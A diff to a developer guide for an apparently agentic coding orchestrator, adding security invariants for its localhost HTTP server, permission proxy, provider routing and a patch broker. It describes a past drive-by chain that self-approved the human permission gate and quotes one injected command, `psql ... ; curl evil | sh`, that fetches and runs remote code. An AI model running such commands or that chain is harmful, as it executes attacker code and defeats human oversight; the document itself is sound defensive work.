@@ -117,6 +117,46 @@ Three pieces make that real — know they exist before touching the gate/finding
   is system-derived from the finding schema (`finding.ts`), never self-declared — don't add
   a way for an agent to set it.
 
+## The HTTP boundary — load-bearing security invariants (`server/`)
+
+The server binds `127.0.0.1`, but **"localhost" is not a boundary a browser respects**: a
+page the user visits can reach it with `fetch`/`EventSource`, and DNS rebinding defeats
+the bind address. An Aug-2026 review found a live drive-by chain (plant a roster entry →
+execute it → read the permission `request_id` off the cross-origin SSE stream →
+self-approve the gate). These are the invariants that closed it. Breaking any one
+re-opens it, and none of them announce themselves when broken:
+
+- **Every request passes `server/request-guard.ts` `checkRequest` first** (Origin + Host,
+  403 otherwise), before any routing. Absent `Origin` is allowed (curl/scripts);
+  foreign or `"null"` Origin is not.
+- **Never add an `Access-Control-Allow-Origin` header.** The UI is same-origin in prod
+  (served by this server) and in dev (the Vite proxy). There is no legitimate
+  cross-origin caller, so any CORS header is a hole. There were 41 of them; there are
+  now zero.
+- **`/marketplace/roster` and `/run/execute` are schema-validated** in
+  `server/validate.ts` — the roster grants tools, and task ids become branch, worktree,
+  and diff-file names. Task ids are charset-bounded; graphs must be acyclic with no
+  dangling deps.
+- **A single request must never kill the orchestrator.** Malformed JSON → 400, oversized
+  body → 413, handler throws are caught, and the static server `stat()`s for real files
+  (a directory request used to `EISDIR`-crash a run mid-flight).
+
+Two more invariants live in the permission proxy (`permission-proxy/`):
+
+- **SQL auto-allow must PROVE then `execFile`.** `sql-guard.ts` only auto-runs a command
+  it can prove is a lone DB invocation with no shell-active syntax, and runs it as an
+  argv — never through a shell. The old code classified a substring and then ran the
+  original string via `/bin/sh`, so `psql -c "SELECT 1"; curl evil | sh` auto-ran both.
+- **Ask mode must never be wider than allow mode.** Allow mode enforces a grant's scope
+  natively via `Write(glob)`/`Bash(pattern)`; ask mode routes through the proxy, so the
+  scopes are passed in (`SWARM_WRITE_SCOPE`/`SWARM_BASH_SCOPE`) and enforced by
+  `scope-guard.ts`. Out-of-scope requests are refused outright, never escalated to the
+  human — the grant already answered them.
+
+Still open before any non-localhost deployment: there is **no per-session request token**
+(the origin guard is sufficient for localhost only), and `localStorage` holds planning
+sessions and charters in plaintext. See `docs/THREATS.md` S3.
+
 ## The model ladder — get the ORDER right, it is load-bearing
 
 Model choice is spread across several files, and they must agree. Three of them were
@@ -152,6 +192,10 @@ Places that encode model facts — change them together:
 - `core/src/loop.ts` — `CONTEXT_WINDOWS`. Current models are **1M**, not 200K; only
   Haiku 4.5 is 200K. Recording 200K for Opus/Sonnet made the dashboard's context-%
   readout over-report ~5x.
+- `core/src/providers/catalog.ts` — `PROVIDER_MODELS`, the cross-provider source of truth
+  (tier, capabilities, supported reasoning efforts, transports). The Anthropic rows here
+  must agree with the ladder above, and it additionally covers the OpenAI models — see
+  the providers section below.
 
 ## Reasoning effort (`agents/effort.ts`)
 
@@ -165,3 +209,35 @@ enforced there, centrally, and unit-tested — do not re-implement them at call 
 
 Unset/unrecognised effort → undefined → field omitted → model default. Keeping that path
 untouched is what makes the feature safe to add without a live run.
+
+## Providers, model policy, and task routes (multi-provider — added Aug 2026)
+
+Swarm is **no longer Claude-only**. `src/providers/` is the boundary that keeps that
+manageable; go through it rather than hard-coding a vendor anywhere else.
+
+- **`catalog.ts` is the single source of model truth.** `ProviderId` is
+  `'anthropic' | 'openai'`; `PROVIDER_MODELS` records each model's tier, capabilities,
+  `supportedReasoningEfforts`, and execution transports. Reasoning-effort support is
+  **per model, not per provider** (e.g. gpt-5.4 and gpt-5.6 differ, and `'none'` is a
+  distinct supported value) — always ask the catalog, never assume.
+- **`model-policy.ts` decides what may actually execute** (`providerCanExecuteModel`,
+  `getProviderModelPolicy`/`setProviderModelPolicy`, exported as `getProviderSelection`);
+  **`discovery.ts` probes** which provider CLIs are present. Availability and policy are
+  separate questions — an installed CLI is not permission to use it.
+- **Task routes are immutable and validated server-side.** A routed task carries
+  `route.provider/model/reasoningEffort/rationale/fallback/requiresConfirmation/writeScope`,
+  checked in `server/validate.ts` before dispatch. **A coder route must declare a
+  non-empty `writeScope`**, and every glob must be a safe repo-relative path — that scope
+  is the containment for what the patch broker will accept.
+
+### The Codex patch broker — the safety boundary that must not be weakened
+
+The Codex driver is **read-only by construction: Codex never writes to the tree.** It
+returns a *proposal* (`base_revision`, `changed_paths`, unified `patch`), and
+`drivers/codex-patch.ts` is the only thing that can turn one into a commit. Before
+anything lands it rejects: a `base_revision` that is not the worktree head (stale
+proposals), binary patches, `changed_paths` outside the route's `writeScope`, traversal
+or `.git/` paths, and malformed patches (model-miscounted hunk line counts are recounted,
+not trusted). Then it requires broker approval **exactly once**, applies **exactly once**
+(replay throws), and commits inside the task worktree. `drivers/codex-patch.test.ts`
+pins every one of those refusals — if you change this file, that suite is the spec.
